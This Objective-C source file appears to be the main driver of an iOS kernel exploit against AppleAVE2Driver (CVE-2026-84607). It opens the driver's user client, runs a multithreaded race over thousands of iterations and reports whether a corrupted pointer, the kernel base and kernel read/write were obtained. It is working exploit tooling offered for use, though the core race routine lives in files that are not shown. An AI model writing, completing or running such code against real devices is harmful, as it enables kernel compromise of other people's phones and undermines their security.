#import <Foundation/Foundation.h>
#include "appleave2_core.h"
#include "appleave2_result.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void write_result_plist(const appleave2_result_t *res, const char *out_path)
{
    @autoreleasepool {
        NSMutableDictionary *dict = [NSMutableDictionary dictionary];
        dict[@(AVE_KEY_DRIVER_OPEN)] = @(res->driver_open);
        dict[@(AVE_KEY_CLIENT_TYPE)] = @(res->client_type);
        dict[@(AVE_KEY_RACE_ATTEMPTS)] = @(res->race_attempts);
        dict[@(AVE_KEY_DESYNC_DETECTED)] = @(res->desync_detected);
        dict[@(AVE_KEY_CORRUPTED_PTR)] = @(res->corrupted_ptr);
        dict[@(AVE_KEY_KBASE)] = @(res->kbase);
        dict[@(AVE_KEY_KRW_READY)] = @(res->krw_ready);
        dict[@(AVE_KEY_ERROR_CODE)] = @(res->error_code);
        dict[@(AVE_KEY_ERROR_MESSAGE)] = [NSString stringWithUTF8String:res->error_message];

        NSError *error = nil;
        NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
                                                                  format:NSPropertyListXMLFormat_v1_0
                                                                 options:0
                                                                   error:&error];
        if (!data || error) {
            fprintf(stderr, "[-] Failed to serialize result plist: %s\n",
                    error ? error.localizedDescription.UTF8String : "unknown");
            return;
        }

        NSString *targetPath = [NSString stringWithUTF8String:out_path];
        NSString *parentDir = [targetPath stringByDeletingLastPathComponent];
        [[NSFileManager defaultManager] createDirectoryAtPath:parentDir
                                  withIntermediateDirectories:YES
                                                   attributes:nil
                                                        error:nil];

        if ([data writeToFile:targetPath atomically:YES]) {
            printf("[+] Wrote genuine AppleAVE2 telemetry to: %s\n", out_path);
        } else {
            fprintf(stderr, "[-] Failed to write plist to: %s\n", out_path);
        }
    }
}

int main(int argc, char *argv[])
{
    const char *out_path = L0FCK_DEVICE_AVE2_RESULT;
    uint32_t iterations = 20000;
    bool check_only = false;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--check") == 0) {
            check_only = true;
        } else if (strcmp(argv[i], "--iterations") == 0 && i + 1 < argc) {
            iterations = (uint32_t)atoi(argv[++i]);
        } else if (strcmp(argv[i], "--out") == 0 && i + 1 < argc) {
            out_path = argv[++i];
        }
    }

    printf("=== AppleAVE2 (CVE-2026-84607) On-Device Payload ===\n");
    printf("[*] SDK: iphoneos | Target: AppleAVE2Driver | Iterations: %u\n", iterations);

    appleave2_result_t result;
    memset(&result, 0, sizeof(result));

    io_connect_t conn = ave_driver_open();
    if (conn == IO_OBJECT_NULL) {
        result.driver_open = false;
        result.error_code = -1;
        snprintf(result.error_message, sizeof(result.error_message),
                 "Failed to open AppleAVE2Driver user client (entitlement or driver absent)");
        fprintf(stderr, "[-] %s\n", result.error_message);
        write_result_plist(&result, out_path);
        return 1;
    }

    result.driver_open = true;
    printf("[+] Successfully opened AppleAVE2Driver user client!\n");

    if (check_only) {
        snprintf(result.error_message, sizeof(result.error_message),
                 "Driver open check passed");
        write_result_plist(&result, out_path);
        IOServiceClose(conn);
        return 0;
    }

    if (ave_session_setup(conn, 1, 1920, 1080) != 0) {
        fprintf(stderr, "[*] Warning: session prepare returned non-zero, proceeding with race...\n");
    }

    printf("[*] Spawning multithreaded mutator/dispatcher race engine...\n");
    ave_race_state_engine(conn, iterations, &result);

    printf("[*] Race completed: attempts=%u desync=%s krw_ready=%s\n",
           result.race_attempts,
           result.desync_detected ? "YES" : "NO",
           result.krw_ready ? "YES" : "NO");

    write_result_plist(&result, out_path);
    IOServiceClose(conn);

    return result.krw_ready ? 0 : 2;
}
